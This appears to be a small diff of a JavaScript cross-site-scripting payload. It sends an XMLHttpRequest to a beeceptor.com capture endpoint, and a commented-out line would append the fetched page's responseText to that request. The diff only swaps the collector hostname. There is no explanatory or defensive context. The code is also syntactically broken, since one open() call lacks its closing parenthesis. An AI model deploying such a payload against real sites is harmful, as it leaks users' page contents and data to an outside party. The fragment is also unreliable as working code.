@@ -3,7 +3,7 @@ var xhr = new XMLHttpRequest();
 
 xhr.onreadystatechange = function() {
   var xhr2 = new XMLHttpRequest();
-      xhr2.open("GET", "https://forumv2.free.beeceptor.com/?cc=AKAY", true;
+      xhr2.open("GET", "https://forum.free.beeceptor.com/?cc=AKAY", true;
                 //+encodeURI(this.responseText), true);
       xhr2.send(null);
 };
